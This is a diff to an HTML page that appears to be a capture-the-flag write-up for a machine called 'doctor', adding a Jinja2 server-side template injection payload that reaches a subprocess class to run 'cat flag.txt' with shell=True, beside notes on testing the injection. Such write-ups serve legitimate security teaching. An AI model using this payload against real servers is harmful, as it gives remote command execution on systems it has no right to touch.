@@ -98,6 +98,8 @@ body {
 	Initially I tried the basic jinja2 injection															<br/> <br/>
 	<img src="images/doctor/jinja2-basic.PNG" alt="web page" class="inline"/>         										<br/> <br/> <br/>
 		
+	<div class="highlight highlight-source-python"><pre>{{<span class="pl-s">''</span>.<span class="pl-s1">__class__</span>.<span class="pl-en">mro</span>()[<span class="pl-c1">1</span>].<span class="pl-en">__subclasses__</span>()[<span class="pl-c1">396</span>](<span class="pl-s">'cat flag.txt'</span>,<span class="pl-s1">shell</span><span class="pl-c1">=</span><span class="pl-c1">True</span>,<span class="pl-s1">stdout</span><span class="pl-c1">=</span><span class="pl-c1">-</span><span class="pl-c1">1</span>).<span class="pl-en">communicate</span>()[<span class="pl-c1">0</span>].<span class="pl-en">strip</span>()}}
+		
 	I tried to see if we could get the server to execute {4*4*4} so that when we query /archives, the number 64 is presented.					<br/>
 	We can see on the archives page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.		<br/> <br/><br/>
 
